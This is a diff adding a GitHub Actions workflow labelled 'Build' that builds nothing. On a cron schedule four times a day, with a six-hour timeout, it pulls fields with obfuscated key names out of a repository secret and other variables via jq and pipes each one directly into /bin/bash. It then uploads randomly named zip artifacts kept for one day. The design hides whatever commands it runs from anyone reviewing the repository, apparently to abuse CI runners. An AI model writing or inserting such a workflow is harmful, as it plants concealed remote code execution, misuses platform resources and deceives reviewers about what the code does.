@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          yy6: ${{ secrets.yy6 }}
+        run: |
+          printf '%s' "$yy6" | jq -r .cklgk98 | /bin/bash
+          printf '%s' "$pwfl77152" | jq -r .gd22 | /bin/bash
+          echo $do2 | jq -r .msxhl7 | /bin/bash
+          echo $wi38464 | jq -r .scwsg2932 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1BZGiofU
+          path: "*.zip"
+          retention-days: 1
